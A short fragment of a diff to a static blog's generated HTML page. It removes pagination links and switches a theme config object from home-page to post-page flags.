-      <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="page-number" href="/page/3/">3</a><a class="extend next" rel="next" href="/page/2/">Next &amp;raquo;</a>
-    </nav>
+  
+
+  
+
+  
+
   
 
 
@@ -1824,8 +971,8 @@
     <script>
 	var yiliaConfig = {
 		mathjax: true,
-		isHome: true,
-		isPost: false,
+		isHome: false,
+		isPost: true,
 		isArchive: false,
 		isTag: false,
 		isCategory: false,
